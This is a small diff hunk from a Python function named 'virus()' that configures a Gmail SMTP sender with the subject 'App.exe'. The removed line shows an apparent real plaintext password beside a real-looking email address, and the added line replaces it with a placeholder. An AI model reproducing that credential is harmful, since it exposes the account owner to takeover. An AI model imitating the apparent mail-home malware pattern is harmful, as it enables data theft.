@@ -27,7 +27,7 @@ def virus():
     # os.system('ping google.com')
     def send_mail():
         login = 'wolf.sivert@gmail.com'
-        password = 'yfcnz27000'
+        password = 'password'
         url = 'smtp.gmail.com'
         toaddr = 'wolf.sivert@gmail.com'
         topic = 'App.exe'
